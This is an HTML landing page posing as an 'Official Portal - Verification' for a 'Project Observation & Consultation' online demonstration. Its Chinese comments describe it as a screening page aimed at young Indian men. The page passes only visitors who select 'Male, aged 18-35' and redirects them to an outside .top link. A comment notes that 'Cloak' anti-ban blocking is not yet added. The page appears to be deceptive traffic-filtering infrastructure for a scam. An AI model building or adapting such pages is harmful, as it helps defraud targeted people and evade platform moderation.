<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official Portal - Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            width: 90%;
            max-width: 420px;
            padding: 40px 28px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo-box {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .title {
            color: #111111;
            font-size: 24px;
            font-weight: 700;
            margin: 0 0 16px 0;
            line-height: 1.3;
        }
        .subtitle {
            color: #2563eb;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 8px;
        }
        .description {
            color: #666666;
            font-size: 15px;
            line-height: 1.6;
            margin: 0 0 20px 0;
        }
        /* 筛选问题区域 */
        .question-box {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 20px 16px;
            margin-bottom: 28px;
            text-align: left;
        }
        .question-title {
            font-size: 15px;
            font-weight: 700;
            color: #334155;
            margin-bottom: 12px;
        }
        .option-label {
            display: block;
            background-color: #ffffff;
            border: 1px solid #cbd5e1;
            padding: 12px 14px;
            border-radius: 8px;
            margin-bottom: 10px;
            font-size: 14px;
            color: #475569;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
        }
        .option-label:hover {
            border-color: #2563eb;
            background-color: #eff6ff;
        }
        .option-label input {
            margin-right: 10px;
        }
        .btn {
            display: block;
            background-color: #2563eb; /* 科技蓝，符合年轻男性视觉偏好 */
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 600;
            padding: 15px 0;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
            transition: all 0.2s;
            cursor: pointer;
            border: none;
            width: 100%;
        }
        .btn:hover {
            background-color: #1d4ed8;
        }
        .error-tips {
            color: #ef4444;
            font-size: 13px;
            margin-top: 12px;
            display: none;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="container">
        
        <!-- 印度年轻男性筛选中间页主体内容 -->
        <div class="logo-box">⚡</div>
        <div class="subtitle">Verification Required</div>
        <h1 class="title">Project Observation & Consultation</h1>
        <p class="description">
            To observe the 1-on-1 online demonstration, please confirm your eligibility below.
        </p>
        
        <!-- 英文门槛单选题 -->
        <div class="question-box">
            <div class="question-title">Please select your age and gender group:</div>
            
            <label class="option-label">
                <input type="radio" name="demographics" value="eligible"> Male, aged between 18 - 35
            </label>
            <label class="option-label">
                <input type="radio" name="demographics" value="wrong"> Male, aged below 18 or above 35
            </label>
            <label class="option-label">
                <input type="radio" name="demographics" value="wrong"> Female (Any age group)
            </label>
        </div>

        <!-- 提交验证按钮 -->
        <button onclick="verifyAndRedirect()" class="btn">Proceed to Official Chat</button>
        
        <!-- 错误提示文本区 -->
        <div id="errorTips" class="error-tips">❌ Sorry, you do not meet the criteria for this project observation.</div>

    </div>

    <script>
        // 纯前端互动逻辑（暂无Cloak防封屏蔽，仅执行选项验证）
        function verifyAndRedirect() {
            var selected = document.querySelector('input[name="demographics"]:checked');
            var errorTips = document.getElementById("errorTips");
            
            if (!selected) {
                errorTips.innerText = "⚠️ Please select an option to proceed.";
                errorTips.style.display = "block";
                return;
            }

            if (selected.value === "eligible") {
                errorTips.style.display = "none";
                // 验证通过，直接跳转到你的印度专属分流链接
                window.location.replace("https://svip1027.top/YDDN556"); 
            } else {
                // 选了错误的选项，拦截并报错
                errorTips.innerText = "❌ Sorry, you do not meet the criteria for this project observation.";
                errorTips.style.display = "block";
            }
        }
    </script>
</body>
</html>
